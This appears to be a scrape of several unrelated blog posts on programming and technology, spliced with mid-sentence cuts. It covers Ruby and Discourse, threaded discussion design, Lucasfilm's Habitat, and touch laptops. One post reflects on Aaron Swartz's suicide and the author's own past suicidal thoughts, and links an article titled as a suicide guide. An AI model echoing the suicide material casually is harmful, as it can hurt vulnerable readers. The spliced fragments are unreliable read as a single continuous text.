is there is a <i>lot</i> of low hanging performance fruit in Ruby-land. Like.. <i>a lot</i> a lot. On Discourse we got an across the board 20% performance improvement just upgrading to Ruby 2.0, and we nearly <i>doubled</i> our performance by <a href=\"http://meta.discourse.org/t/tuning-ruby-and-rails-for-discourse/4126\">increasing the default Ruby garbage collection limit</a>. From a future performance perspective, Ruby is nothing but upside.</p><li><p>Ruby <b>isn't cool any more</b>. Yeah, you heard me. It's not cool to write Ruby code any more. All the cool people moved on to slinging Scala and Node.js years ago. Our project isn't cool, it's just a bunch of boring old Ruby code. Personally, I'm <i>thrilled</i> that Ruby is now mature enough that the community no longer needs to bother with the pretense of being the coolest kid on the block. That means the rest of us who just like to Get Shit Done can roll up our sleeves and focus on the mission of building stuff with our peers rather than frantically running around trying to <a href=\"http://www.codinghorror.com/blog/2008/01/the-magpie-developer.html\">suss out the next shiny thing</a>.</p></ul><p>And of <i>course</i> the Ruby community is, and always has been, amazing. We never want for great open source gems and great open source contributors. Now is a fantastic time to get into Ruby, in my opinion, whatever your background is.</p>(However, It's also worth mentioning that Discourse is, if anything, even more of a <b>JavaScript project</b> than a Ruby on Rails project. Don't believe me? Just go to <a href=\"http://try.discourse.org\">try.discourse.org</a> and view source. A Discourse forum is not so much a website as it is a full-blown JavaScript application that happens to run in your browser.)</p><p>Even if done in good will and for the best interests of the project, it's still a little scary to totally change your programming stripes overnight after two decades. I've always believed that great programmers learn to love more than one language and programming environment – and I hope the Discourse project is an opportunity for <i>everyone</i> to learn and grow, not just me. <b>So <a href=\"https://github.com/discourse/discourse\">go fork us on GitHub</a> already!</b></p><table><tr><td class=\"welovecodinghorror\">[advertisement] Hiring developers?

Someone who actively worked to change the world for the better in everything he did, starting from the age of 12. There was no evil in this man. And yet the absurd government case against him was cited by his family as <a href=\"http://www.latimes.com/news/obituaries/la-me-0113-aaron-swartz-20130113,0,5232490.story\">directly contributing to his death</a>.</p><p>I'm frustrated by the idea that <b>martyrdom</b> works. The death of Aaron Swartz is now turning into <a href=\"http://www.theatlantic.com/technology/archive/2013/01/aarons-law-violating-a-sites-terms-of-service-should-not-land-you-in-jail/267247/\">an effective tool for change</a>, a rallying cry, proving the perverse lesson that nobody takes an issue seriously until a great person dies for the cause. The idea that Aaron killing himself <i>was a viable strategy</i>, more than going on to prevail in this matter and so many more in his lifetime, makes me incredibly angry.</p><p>But also, I must admit that I am a little disappointed in <b>Aaron</b>. I understand that depression is a serious disease that can fell any person, however strong. But he chose the path of the activist long ago. And the path of the activist is to <i>fight</i>, for as long and as hard as it takes, to effect change. Aaron had powerful friends, a powerful support network, and a keen sense of moral cause that put him in the right. That's how he got that support network of powerful friends and fellow activists in the first place.</p><p>It is appropriate to write about Aaron on Martin Luther King day, because he too was <a href=\"http://www.africa.upenn.edu/Articles_Gen/Letter_Birmingham.html\">a tireless activist for moral causes</a>.</p><blockquote>I hope you are able to see the distinction I am trying to point out. In no sense do I advocate evading or defying the law, as would the rabid segregationist. That would lead to anarchy. <b>One who breaks an unjust law must do so openly, lovingly, and with a willingness to accept the penalty.</b> I submit that an individual who breaks a law that conscience tells him is unjust, and who willingly accepts the penalty of imprisonment in order to arouse the conscience of the community over its injustice, is in reality expressing the highest respect for law.</blockquote><p>Let's be clear that the penalty in Aaron's case was <i>grossly</i> unfair, <a href=\"http://harpers.org/blog/2013/01/carmen-ortiz-strikes-out/\">bordering on corrupt</a>. I've been a part of <a href=\"http://www.codinghorror.com/blog/2012/09/somebody-is-to-blame-for-this.html\">exactly one trial</a>, but I can't even imagine having the full resources of the US Government brought to bear against me, with extreme prejudice, for a year or more. His defense was estimated to cost millions. The idea that such an engaged citizen would be forever branded a felon – serving at least some jail time and stripped of the most fundamental citizenship right, the ability to vote – must have weighed heavily on Aaron. And Aaron was no stranger to depresson, having written about it on his blog many times, even penning a public will of sorts on his blog all the way back in 2002.</p><p>I think about <a href=\"http://knowyourmeme.com/memes/rage-quit\">ragequitting</a> a lot.</p><blockquote>Rage Quit, also seen as RageQuit in one word, is Internet slang commonly used to describe the act of suddenly quitting a game or chatroom after either an argument, extreme frustration, or loss of the game.</blockquote><p>At least one user ragequits Stack Exchange every six months, because our rules are strict. Some people don't like rules, and can respond poorly when confronted by the rules of the game they choose to play. It came up often enough that we had to create even more rules to deal with it. I was forced to think about ragequitting.<p></p>I was very angry with <a href=\"http://en.wikipedia.org/wiki/Mark_Pilgrim_(software_developer)#.22Disappearance.22_from_the_Internet\">Mark Pilgrim</a> and <a href=\"http://en.wikipedia.org/wiki/Why_the_lucky_stiff\">_why</a> for ragequitting the Internet, because they also took all their content offline – they got so frustrated that they took their ball and went home, so nobody else could play. How incredibly rude. Ragequitting is childish, a sign of immaturity. But it is another thing entirely to play the final move and take your own life. To declare the end of this game and all future games, <b>the end of ragequitting itself</b>.</p><p>I say this not as a person who wishes to judge Aaron Swartz. I say it as a fellow gamer who has also considered playing the same move quite recently. To the point that I – like Aaron himself, I am sure – was actively researching it. But the more I researched, the more I thought about it, the more it <a href=\"http://www.cracked.com/article_15658_the-ten-minute-suicide-guide.html\">felt like what it really was</a>: <i>giving up</i>. And the toll on friends and family would be unimaginably, unbearably heavy.</p><p>What happened to Aaron was not fair. Not even a little. But <i>this is the path of the activist</i>. The greater the injustice, the greater wrong undone when you ultimately prevail. And I am convinced, absolutely and utterly convinced, that Aaron <i>would</i> have prevailed. He would have gone on to do so many other great things. It is our great failing that we did not provide Aaron the support network he needed to see this. All we can do now is <a href=\"http://www.plainsite.org/asymptote/index.html\">continue the mission he started</a> and lobby for change to our <a href=\"http://www.forbes.com/sites/timothylee/2013/01/17/aaron-swartz-and-the-corrupt-practice-of-plea-bargaining/\">corrupt government practices of forcing plea bargains</a>.</p><p>It gets dark sometimes. I know it does. I'm right there with you. <b>But do not, under any circumstances, give anyone the satisfaction of seeing you ragequit.</b> They don't deserve it.

Putting aside Usenet as a relic and artifact of the past, it is rare to find threaded discussions of any kind on the web today; for web discussion communities that are more than ten years old, the vast majority are flat as a pancake.</p><p>I'm game for trying anything new, I mean, I even tried <i>Google Wave</i>. But the more I've used threaded discussions of any variety, the less I like them. I find precious few redeeming qualities, while threading tends to break crucial parts of discussion like reading and replying in deep, fundamental, unfixable ways. I have yet to discover a threaded discussion design that doesn't eventually make me hate it, and myself.</p><p>A part of me says this is software Darwinism in action: <b>threaded discussion is ultimately too complex to survive on the public Internet</b>.</p><p><a href=\"http://news.ycombinator.com/item?id=4887447\"><img alt=\"Hacker-news-threading\" title=\"Hacker-news-threading\" src=\"http://www.codinghorror.com/.a/6a0120a85dcdae970b017d3ec46626970c-800wi\" width=\"720\" height=\"837\" /></a><br /></p><p>Before threaded discussion fans bring out their pitchforks and torches, I fully acknowledge that <i>aspects</i> of threading can be useful in certain specific situations. I will get to that. I know I'm probably wasting my time even attempting to say this, but please: keep reading before commenting. Ideally, read the <i>whole article</i> before commenting. Like Parappa, <a href=\"http://en.wikipedia.org/wiki/PaRappa_the_Rapper\">I gotta believe!</a></p><p>Before I defend threaded discussion, let's enumerate the many problems it brings to the table:</p><ol><li><b>It's a tree</b>. <br/><p>Poems about trees are indeed lovely, as Joyce Kilmer promised us, but <a href=\"http://www.codinghorror.com/blog/2005/03/trees-treeviews-and-ui.html\">data of any kind represented as a tree … isn't</a>. Rigid hierarchy is generally not how the human mind works, and the strict parent-child relationship it enforces is particularly terrible for fluid human group discussion. Browsing a tree is complicated, because you have to constantly think about what level you're at, what's expanded, what's collapsed … there's always this looming existential crisis of <i>where the heck am I?</i> Discussion trees force me to spend too much time mentally managing that two-dimensional tree more than the underlying discussion.</p><li><b>Where did that reply go?</b><br/><p>In a threaded discussion, replies can arrive any place in the tree at any time. How do you know if there are new replies? Where do you find them? Only if you happen to be browsing the tree at the right place at the right time. It's annoying to follow discussions over time when new posts keep popping up anywhere in the middle of the big reply tree. And God help you if you accidentally reply at the wrong level of the tree; then you're suddenly talking to the wrong person, or maybe nobody at all. For that matter, it absolutely <i>kills</i> me that there might be amazing, insightful responses buried somewhere in the middle of a reply chain that I will never be able to find. Most of all, it just makes me want to leave and never come back.</p><li><b>It pushes discussion off your screen</b>.<br/><p>So the first reply is indented under the post. Fair enough; how else would you know that one post is a reply to another post? But this indentation game <i>doesn't ever end</i>. Reply long and hard enough and you've either made the content column impossibly narrow, or you've pushed the content to exit, stage right. That's how endless pedantic responses-to-responses ruin the discussion for everyone. I find that in the \"indent everything to the right\" game, there are no winners, only losers. It is natural to scroll <i>down</i> on the web, but it is utterly unnatural to scroll <i>right</i>. Indentation takes the discussion in the wrong direction.</p><li><b>You're talking to everyone.</b><br/><p>You think because you clicked \"reply\" and your post is indented under the person you're replying to, that your post is talking only to that person? That's so romantic. Maybe the two of you should get a room. A special, private room at the far, far, far, far, <i>far</i> right of that threaded discussion. This illusion that you are talking to one other person ends up harming the discussion for everyone by polluting the tree with these massive narrow branches that are constantly in the way.</p><p>At an absolute minimum you're addressing everyone else in that discussion, but in reality, you're talking to anyone who will listen, for all time. Composing your reply as if it is a reply to just one person is a quaint artifact of a world that doesn't exist any more. Every public post you make on the Internet, reply or not, is actually talking to <i>everyone who will ever read it</i>. It'd be helpful if the systems we used for discussion made that clear, rather than maintaining this harmful pretense of private conversations in a public space.</p><li><b>I just want to scroll down.</b><p>Reddit (and to a lesser extent, Hacker News) are probably the best known examples of threaded comments applied to a large audience. While I find Reddit so much more tolerable than the bad old days of Digg, I can still barely force myself to wade through the discussions there, because it's so much darn <i>work</i>. As a lazy reader, I feel I've already done my part by deciding to enter the thread; after that all I should need to do is scroll or swipe down.</p><p>Take <a href=\"http://www.reddit.com/r/pics/comments/14svrt/my_little_brother_had_an_interesting_night/\">what's on the top of reddit right now</a>. It's a cool picture; who wouldn't want to meet Steve Martin and Morgan Freeman? But what's the context? Who is this kid? How did he get so lucky? To find out, I need to collapse and suppress dozens of random meaningless tangents, and the replies-to-tangents, by clicking the little minus symbol next to each one. So that's what I'm doing: reading a little, deciding that tangent is not useful or interesting, and clicking it to get rid of it. Then I arrive at the end and find out that information wasn't even in the topic, or at least I couldn't find it. I'm OK with scrolling down to find information and/or entertainment, to a point. What I object to is the menial labor of collapsing and expanding threaded portions of the topic as I read. Despite what the people posting them might think, those tangents aren't so terribly important that they're worth making me, and every other reader, act on them.</p></ol><p>Full bore, no-holds-barred threading is an unmitigated usability disaster for discussion, everywhere I've encountered it. But what if we didn't commit to this idea of threaded discussion quite so wholeheartedly?</p><p>The most important guidance for non-destructive use of threading is to <b>put a hard cap on the level of replies that you allow</b>. Although <a href=\"http://meta.stackoverflow.com/questions/92107/is-stack-overflow-a-forum\">Stack Exchange is not a discussion system</a> – it's actually the <i>opposite</i> of a discussion system, which we have to explain to people all the time – we did allow, in essence, one level of threading. There are questions and answers, yes, but underneath each of those, in smaller type, are the comments.</p><p><a href=\"http://wordpress.stackexchange.com/questions/74519/how-to-create-editable-blocks-of-text-for-the-homepage\"><img alt=\"Stack-exchange-threading\" title=\"Stack-exchange-threading\" src=\"http://www.codinghorror.com/.a/6a0120a85dcdae970b017ee63983db970d-800wi\" width=\"720\" height=\"787\" /></a></p><p>Now there's a bunch of hard-core discussion sociology here that I don't want to get into, like different rules for comments, special limitations for comments, only showing the top n of comments by default, and so forth. What matters is that we allow <b>one level of replies and that's it</b>. Want to reply to a comment? You can, but it'll be at the same level. You can go no deeper. This is by design, but remember: <i>Stack Exchange is not a discussion system</i>. It's a question and answer system. If you build your Q&A system like a discussion system, it will devolve into Yahoo Answers, or even worse, Quora. Just kidding Quora. <a href=\"http://www.quora.com/What-did-Jesus-farts-probably-smell-like\">You're great</a>.</p><p>Would Hacker News be a better place for discussion if they capped reply level? Would Reddit? From my perspective as a poor, harried reader and very occasional participant, absolutely. There are many chronic problems with threaded discussion, but capping reply depth is the easiest way to take a giant step in the right direction.</p><p>Another idea is to let posts bring their context with them. This is one of the things that Twitter, the company that always does everything wrong and succeeds anyway, gets … shockingly right out of the gate. When I view <a href=\"https://twitter.com/codinghorror/status/276413253209448449\">one of my tweets</a>, it can stand alone, as it should. But it can also bring some context along with it on demand:</p><p><a href=\"https://twitter.com/codinghorror/status/276413253209448449\"><img class=\"asset  asset-image at-xid-6a0120a85dcdae970b017ee6399d08970d image-full\" alt=\"Twitter-threading\" title=\"Twitter-threading\" src=\"http://www.codinghorror.com/.a/6a0120a85dcdae970b017ee6399d08970d-800wi\" width=\"600\" height=\"961\" /></a></p><p>Here you can see how <a href=\"https://twitter.com/codinghorror/status/276413253209448449\">my tweet</a> can be  expanded with a direct link or click to show the necessary context for the conversation. But it'll only show three levels: the post, my reply to the post, and replies to my post. This idea that tweets – and thus, conversations – should be mostly standalone is not well understood, but it illustrates how Twitter got the <i>original concept</i> so fundamentally right. I guess that's why they can get away with the terrible execution.</p><p>I believe <b>selective and judicious use of threading</b> is the only way it <i>can</i> work for discussion. You should be wary of threading as a general purpose solution for human discussions. Always favor simple, flat discussions instead.</p><table><tr><td class=\"welovecodinghorror\">[advertisement] How are you showing off your awesome?

It's basically World of Warcraft … in 1985.</p><p><blockquote><p><a href=\"http://en.wikipedia.org/wiki/Habitat_(video_game)\">Habitat</a> is \"a multi-participant online virtual environment,\" a cyberspace.</p><p><img alt=\"Habitat\" title=\"Habitat\" src=\"http://www.codinghorror.com/.a/6a0120a85dcdae970b017c3424c4d8970b-800wi\" width=\"320\" height=\"240\" valign=\"right\" /></p><p>Each participant (\"player\") uses a home computer (Commodore 64) as an intelligent, interactive client, communicating via modem and telephone over a commercial packet-switching network to a centralized, mainframe host system. The client software provides the user interface, generating a real-time animated display of what is going on and translating input from the player into messages to the host. The host maintains the system's world model enforcing the rules and keeping each player's client informed about the constantly changing state of the universe.</p></blockquote><p>This was the dark ages of home computing. In 1985, that 64k of memory in a Commodore 64 was a <i>lot</i>. The entirety of Turbo Pascal 3.02 for DOS, released a year later in 1986, <a href=\"http://prog21.dadgum.com/116.html\">was barely 40k</a>.</p>The very concept of a multiplayer virtual world of any kind – something we take for granted today, since every modern website is essentially a multiplayer game now — was incredibly exotic. Look at the painstaking explanation Lucasfilm had to produce to even get folks to understand what the heck Habitat was, and how it worked:</p><iframe width=\"480\" height=\"360\" src=\"http://www.youtube.com/embed/VVpulhO3jyc\" frameborder=\"0\" allowfullscreen></iframe><p>The technical information in <a href=\"http://www.fudco.com/chip/lessons.html\">The Lessons of Lucasfilm's Habitat</a> is incredibly dated, as you'd expect, and barely useful even as trivia. But the sociological lessons of Habitat cut to the bone. They're as fresh today as they were in 1985. Computers have radically changed in the intervening 27 years, whereas people's behavior hasn't. At all. This particular passage hit home:</p><blockquote>Again and again we found that activities based on often unconscious assumptions about player behavior had completely unexpected outcomes (when they were not simply outright failures). It was clear that we were not in control. The more people we involved in something, the less in control we were. <b>We could influence things, we could set up interesting situations, we could provide opportunities for things to happen, but we could not predict nor dictate the outcome.</b> Social engineering is, at best, an inexact science, even in proto-cyberspaces. Or, as some wag once said, \"in the most carefully constructed experiment under the most carefully controlled conditions, the organism will do whatever it damn well pleases.\"</blockquote><p>Even more specifically:</p><blockquote>Propelled by these experiences, we shifted into a style of operations in which we let the players themselves drive the direction of the design. This proved far more effective. <b>Instead of trying to push the community in the direction we thought it should go, an exercise rather like herding mice, we tried to observe what people were doing and aid them in it.</b> We became facilitators as much as designers and implementors. This often meant adding new features and new regions to the system at a frantic pace, but almost all of what we added was used and appreciated, since it was well matched to people's needs and desires. As the experts on how the system worked, we could often suggest new activities for people to try or ways of doing things that people might not have thought of. In this way we were able to have considerable influence on the system's development in spite of the fact that we didn't really hold the steering wheel -- more influence, in fact, than we had had when we were operating under the delusion that we controlled everything.</blockquote><p>That's exactly what I was trying to say in <a href=\"http://www.codinghorror.com/blog/2012/02/listen-to-your-community-but-dont-let-them-tell-you-what-to-do.html\">Listen to Your Community, But Don't Let Them Tell You What to Do</a>. Unfortunately, because I hadn't read this essay until a few months ago, I figured this important lesson out <i>25 years later</i> than Randy Farmer and Chip Morningstar. So many Stack Overflow features were the direct result of observing what the community was doing, then attempting to aid them in it:</p><ul><li>We noticed early in the Stack Overflow beta that users desperately wanted to reply to each other, and were cluttering up the system with \"answers\" that were, well, not answers to the question. Rather than chastize them for doing it wrong – <i>stupid users!</i> – we added the commenting system to give them a method of annotating answers and questions for clarifications, updates, and improvements.<br/><br/><li>I didn't think it was necessary to have a place to discuss Stack Overflow. And I was … kind of a jerk about it. The community was on the verge of creating a phpBB forum instance to discuss Stack Overflow. Faced with a nuclear ultimatum, I relented, and you know what? <a href=\"http://www.codinghorror.com/blog/2009/07/meta-is-murder.html\">They were right</a>. And I was wrong.<br/><br/><li>The community came up with an interesting convention for <a href=\"http://blog.stackoverflow.com/2009/04/handling-duplicate-questions/\">handling duplicate questions</a>, by manually editing a blockquote into the top of the question with a link to the authoritative question that it was a duplicate of. This little user editing convention eventually became the template for the official implementation.</ul><p>I could go on and on, but I won't bore you. I'd say for every 3 features we introduced on Stack Overflow, at least two of them came more or less directly from observing the community, then trying to run alongside them, building tools that <b>helped them do what they wanted to do with less fuss and effort</b>. That was my job for the last four years. And I loved it, until I had to <a href=\"http://www.codinghorror.com/blog/2012/02/farewell-stack-exchange.html\">stop loving it</a>.</p><p><a href=\"http://en.wikipedia.org/wiki/Randy_Farmer\">Randy Farmer</a>, one of the primary designers of Habitat at Lucasfilm, went on to work on a bunch of things that you may recognize: with <a href=\"http://en.wikipedia.org/wiki/Douglas_Crockford#Career\">Douglas Crockford</a> on JSON, The Sims Online, Second Life, Yahoo 360°, Yahoo Answers, Answers.com, and so forth. He eventually condensed some of his experience into a book, <a href=\"http://www.amazon.com/dp/059615979X/?tag=codihorr-20\">Building Web Reputation Systems</a>, which I bought in April 2011 as a Kindle edition. I didn't know who Mr. Farmer was at this time.

Out of curiosity, I looked up the author on my own site. And <a href=\"http://stackoverflow.com/users/523113/f-randall-farmer\">I found him</a>, with a <i>tiny</i> reputation.

I found touch interactions on Surface highly complementary to the keyboard. Way more than I would have ever believed, because I lived through the terror that was Pen Computing. If you need precision, you switch to the mouse or touchpad – but given the increasing prevalence of touch-friendly app and web design, that's not as often as you'd think. Tablets are selling like hotcakes, and every day the world becomes a more touch friendly place, with simpler apps that more people can understand and use on basic tablets. This a good thing. But this also means <b>it is only a matter of time before all laptops must be touch laptops</b>.</p><p>I've become quite <s>obsessed</s> enamored with this touch laptop concept. I've used the Surface a <i>lot</i> since then. I own two, including the touch and type covers. I also impulsively splurged on a <a href=\"http://www.lenovo.com/products/us/laptop/ideapad/yoga/yoga-13/\">Lenovo Yoga 13</a>, which is a more traditional laptop form factor.</p><p><a href=\"http://www.lenovo.com/products/us/laptop/ideapad/yoga/yoga-13/\"><img  alt=\"Yoga-13-rotation\" title=\"Yoga-13-rotation\" src=\"http://www.codinghorror.com/.a/6a0120a85dcdae970b017c33b92a5d970b-800wi\" width=\"700\" height=\"575\" /></a><br /></a></p><p>One of the primary criticisms of the Surface RT is that, since it is an ARM based Tegra 3 device, it does not run traditional x86 apps. That's likely also why it comes with a bundled version of Office 2013. Well, the Yoga 13 resolves that complaint, because it's a Core i5 Ivy Bridge machine. But there is a cost for this x86 compatibility:</p><table cellpadding=2 cellspacing=2 width=\"500\"><tr><td> </td><td><b>Surface RT</b></td><td><b>Surface Pro</b></td><td><b>Yoga 13</b></td></tr><tr><td>weight</td><td>1.5 lb</td><td>2.0 lb</td><td>3.4 lb</td></tr><tr><td>volume</td><td>27\"</td><td>39\"</td><td>78\"</td></tr><tr><td>runtime</td><td>8 hr</td><td>6? hr</td><td>5.5 hr</td></tr><tr><td>display</td><td>10.6\" 1366×768</td><td>10.6\" 1920×1080</td><td>13.3\" 1600×900</td></tr><tr><td>memory</td><td>2 GB / 32 GB</td><td>4 GB / 64 GB</td><td>4 GB / 128 GB</td></tr><tr><td>price</td><td>$599</td><td>$999</td><td>$999</td></tr></table></p><p>The size comparison isn't entirely fair, since the Yoga is a 13.3\" device, and the Surface is a 10.6\" device. But Surface Pro has x86 internals and is otherwise as identical to the Surface RT as Microsoft could possibly make it, and it's still 44% larger and 33% heavier. <b>Intel inside comes at a hefty cost in weight, battery life, and size</b>.</p><p>You do get something for that price, though: compatibility with the vast library of x86 apps, and speed. The Yoga 13 is <i>absurdly</i> fast by tablet standards. Its Sunspider score is approximately 150 ms, compared to my iPad 4 at 738 ms, and the Surface RT at 1036 ms. Five hours of battery life might not seem like such a bad tradeoff for <i>six times the performance</i>.</p><p>I like the Yoga 13 a lot, and it is getting <a href=\"http://www.engadget.com/2012/11/15/lenovo-ideapad-yoga-13-review/\">deservedly good reviews</a>. Some reviewers think it's the <a href=\"http://www.popsci.com/gadgets/article/2012-11/lenovo-yoga-13-review-windows-8-laptop-you-should-buy\">best Windows 8 laptop</a> available right now. It is a fine replacement for my ultrabook, and as long as you <a href=\"http://forums.lenovo.com/t5/IdeaPad-IdeaTab-Slate-Tablets/Ideapad-Yoga-hard-disk-allocation/m-p/913425#M13007\">fix the brain-damaged default drive partitioning</a>, scrape off the handful of stickers on it, and uninstall the few pre-installed craplets, it is eminently recommendable. You can also easily <a href=\"http://www.youtube.com/watch?v=Z5uCooHm4kw\">upgrade it from 4 GB to 8 GB</a> of RAM for about $40.</p><p>But there were things about the practical use of a touch laptop, subtle things that hadn't even occurred to me until I tried to sit down and use one for a few hours, that made me pause:</p><ol><li><b>The screen bounces when you touch it</b>. Maybe I just have hulk-like finger strength, but touching a thin laptop screen tends to make it bounce back a bit. That's … exactly what you <i>don't</i> want in a touch device. I begin to understand why the Surface chose its \"fat screen, thin keyboard\" design rather than the traditional \"thin screen, fat keyboard\" of a laptop. You need the inertia on the side you're touching. The physics of touching a thin, hinged laptop screen are never going to be particularly great. Yes, on the Yoga I can wrap the screen around behind the keyboard, or even prop it up like a tent – but this negates the value of the keyboard which is the biggest part of the touch laptop story! If I wanted a keyboardless tablet, I'd use one of the four I have in the house already. And the UPS guy just delivered a Nexus 10.<br/><br/><li><b>A giant touchpad makes the keyboard area too large</b>. On a typical laptop, a Texas size touchpad makes sense. On a touch laptop, giant touchpads are problematic because they push the screen even farther away from your hand. This may sound trivial, but it isn't. A ginormous touchpad makes every touch interaction you have that much more fatiguing to reach. I now see why the Surface opted for a tiny touchpad on its touch and type covers. A touchpad should be a method of last resort on a touch laptop anyway, because touch is more convenient, and if you need true per-pixel precision work, you'll plug in a mouse. Have I mentioned how convenient it is to have devices that accept standard USB mice, keyboards, drives, and so on? Because it is.<br/><br/><li><b>Widescreen is good for keyboards, but awkward for tablets</b>. A usable keyboard demands a certain minimum width, so widescreen it is; all touch laptops are going to be widescreen by definition. You get your choice between ultra wide or ultra tall. The default landscape mode works great, but rotating the device and using it in portrait mode makes it <i>super</i> tall. On a widescreen device, portrait orientation becomes a narrow and highly specialized niche. It's also <i>very</i> rough on lower resolution devices; neither the 1366×768 Surface RT nor the 1600×900 Yoga 13 really offer enough pixels on the narrow side to make portrait mode usable. You'd need a true retina class device to make portrait work in widescreen. I began to see why the iPad was shipped with a 4:3 display and not a 16:9 or 16:10 one, because that arrangement is more flexible on a tablet. I frequently use my iPad 4 in either orientation, but the Yoga and Surface are only useful in landscape mode except under the most rare of circumstances.<br/><br/><li><b>About 11 inches might be the maximum practical tablet size</b>. Like many observers, I've been amused by the race to produce the largest possible phone screen, resulting in 5\" phablets that are <a href=\"http://gigaom.com/mobile/despite-name-phablets-to-be-big-sellers-208m-in-2015/\">apparently quite popular</a>. But you'll also note that <a href=\"http://daringfireball.net/2012/10/ipad_mini\">even the most ardent Apple fans</a> seem to feel that the 7\" iPad mini is an inherently superior form factor to the 10\" iPad. I think both groups are fundamentally correct: for a lot of uses, the 3.5\" phone really is too small, and the 10\" tablet really is too big. As a corollary to that, I'd say anything larger than the 10.6\" Surface is <i>far</i> too large to use as a tablet. Attempting to use the 13.3\" Yoga as a tablet is incredibly awkward, primarily because of the size. Even if the weight and volume were pushed down to imaginary Minority Report levels, I'm not sure I would want a 13.3\" tablet on my lap or in my hands. There must be a reason the <a href=\"http://en.wikipedia.org/wiki/Letter_(paper_size)\">standard letter page size</a> is 8&half; × 11\", right?<br/><br/><li><b>All-day computing, or, 10 hours of battery life</b>. The more devices I own, the more I begin to appreciate those that I can use for 8 to 10 hours before needing to charge them. There is truly something a little magical about that 10 hour battery life number, and I can now understand why Apple seemed to target 9-10 hours of battery life in their initial iPad and iPhone designs. A battery life of 4 to 6 hours is nothing to sneeze at, but … I feel anxiety about carrying the charger around, whether I've charged recently or not, and I worry over screen brightness and other battery maximization techniques. When I can safely go 8 to 10 hours, I figure that even if I use the heck out of the device – as much as any human being reasonably could in a single day – I'll still safely make it through and I can stick it in a charger before I go to bed.</ol><p><p>To appreciate just how extreme portrait mode is on a widescreen tablet, experience it yourself:</p><table><tr><td valign=\"top\"><a href=\"http://www.codinghorror.com/.a/6a0120a85dcdae970b017d3de872f7970c-pi\"><img alt=\"Yoga-13-landscape-small\" title=\"Yoga-13-landscape-small\" src=\"http://www.codinghorror.com/.a/6a0120a85dcdae970b017d3dd4960d970c-800wi\" width=\"350\" /></a></td><td valign=\"top\"><a href=\"http://www.codinghorror.com/.a/6a0120a85dcdae970b017c33b9e3d6970b-pi\"><img alt=\"Yoga-13-portrait-small\" title=\"Yoga-13-portrait-small\" src=\"http://www.codinghorror.com/.a/6a0120a85dcdae970b017ee549a179970d-800wi\" width=\"350\" /></a></td></tr></table><p>This isn't specific to touch laptops; it's a concern for all widescreen devices. I have the same problem with the taller iPhone 5. Because I now have to choose between super wide or super tall, it is a less flexible device in practice.</p><p>The Yoga 13, if representative of the new wave of Windows 8 laptops, is a clear win even if you have no intention of ever touching your screen:</p><ul><li>It boots up incredibly fast, in a few seconds.<li>It wakes and sleeps incredibly fast, nearly instantaneously.<li>The display is a <a href=\"http://www.codinghorror.com/blog/2012/07/the-ips-lcd-revolution.html\">high quality IPS model</a>.<li>A rotating screen offers a number of useful modes: presentation, (giant) tablet, standard laptop.<li>Touchpad and keyboard work fine; at the very least, they're no worse than the typical PC laptop to me.<li>Does the prospect of using Windows 8 frighten and disturb you? No worries, smash Windows+D on your keyboard immediately after booting and pretend you're using Windows 7.5. Done and done.</ul></p><p>It's a nice laptop. You could do far worse, and many have. In the end, <b><a href=\"http://www.lenovo.com/products/us/laptop/ideapad/yoga/yoga-13/\">the Yoga 13</a> is just a nice laptop with a touchscreen slapped on it</b>. But the more I used the Yoga the more I appreciated the subtle design choices of Surface that make it a far better <i>touch</i> laptop. I kept coming back to how much I enjoyed using the Surface as the platonic ideal of what touch laptops should be.</p><p>Yes, it is a bummer that <a href=\"http://www.microsoft.com/Surface/\">the only currently available Surface</a> is ARM based and does not run any traditional Windows apps. It's easy to look at the x86 performance of the Yoga 13 and assume that Windows on ARM is a cute, temporary throwback to Windows NT on Alpha or MIPS which will never last, and understandably so. Do you see anyone running Windows on Alpha or MIPS CPUs today? But I'm mightily impressed with the Tegra 3 SOC (system-on-a-chip) that runs both the Surface RT and the Nexus 7. Upcoming Tegra releases, <a href=\"http://en.wikipedia.org/wiki/Tegra#Upcoming_releases\">all named after superheroes</a>, promise <b>75 times</b> the performance of Tegra 2 by 2014. I can't quite determine how much faster Tegra 3 was than Tegra 2, but even if it is \"only\" ten times faster by 2014, that's … amazing.</p><p>I think we're beginning to uncover the edges of a world where lack of x86 compatibility is no longer the kiss of death it used to be. It's unclear to me that Intel can ever reach equivalent performance per watt with ARM; Intel's ultra-low-end <a href=\"http://gigaom.com/mobile/intel-v-arm-the-chromebook-performance-battle/\">Celeron 847 is twice as fast as the ARM A15</a>, but it's also <a href=\"http://ark.intel.com/products/56056/Intel-Celeron-Processor-847-2M-Cache-1_10-GHz\">17 watts TDP</a>. In a land of ARM chips that pull an absolute maximum of 4 watts at peak, slapping Intel Inside will instantly double the size and weight of your device – or halve its battery life, your choice. Intel's been trying to turn the battleship, but with <a href=\"http://www.wired.com/business/2012/08/ff_intel/all/\">very limited success so far</a>. Haswell, the successor to the Ivy Bridge CPUs in the Surface Pro and Yoga 13, only gets to 10 watts at idle. And Intel's long neglected Atom line, thanks to years of institutional crippling to avoid cannibalizing Pentium sales, is poorly positioned to compete with ARM today.</p><p>Still, <b>I would not blame anyone for waiting on the <a href=\"http://www.microsoft.com/Surface/en-US/surface-with-windows-8-pro/home\">Surface Pro</a></b>. A high performance, HD touch laptop in the Surface form factor that runs every x86 app you can throw at it is a potent combination … even if it is 44% larger and 33% heavier.</p><table><tr><td class=\"welovecodinghorror\">[advertisement] <a href=\"http://careers.stackoverflow.com/\" rel=\"nofollow\">Stack Overflow Careers</a> matches the best developers (you!) with the best employers.

In short, <b>it is a fantastic time to be a <i>computer nerd</i>.</b></p><p><a href=\"http://www.imdb.com/title/tt0088000/\"><img alt=\"Revenge of the nerds\" title=\"Revenge of the nerds\" src=\"http://www.codinghorror.com/.a/6a0120a85dcdae970b017d3d2a90fd970c-pi\" width=\"370\" height=\"558\" /></a></p><p>I <a href=\"http://www.codinghorror.com/blog/2007/01/if-loving-computers-is-wrong-i-dont-want-to-be-right.html\">love computers</a>, always have, always will. <b>My strategy with new computing devices is simple: I buy 'em all, then try living with them.</b> The devices that fall away from me over time – the ones that gather dust, or that I forget about – are the ones I eventually get rid of. So long, Kindle Fire! I knew that the Nexus 7 was really working for me when I gave mine to my father as a spontaneous gift while he was visiting, then missed it sorely when waiting for the replacement to arrive.</p><p>As I use these devices, I've grown more and more sold on the idea that touch is going to dominate the next era of computing. <a href=\"http://www.codinghorror.com/blog/2012/10/the-pc-is-over.html\">This reductionism is inevitable and part of the natural evolution of computers</a>. Remove the mouse. Remove the keyboard. Remove the monitor. Reducing a computer to its <i>absolute minumum</i> leads us inexorably, inevitably to the tablet (or, if a bit smaller, the phone). All you're left with is a flat, 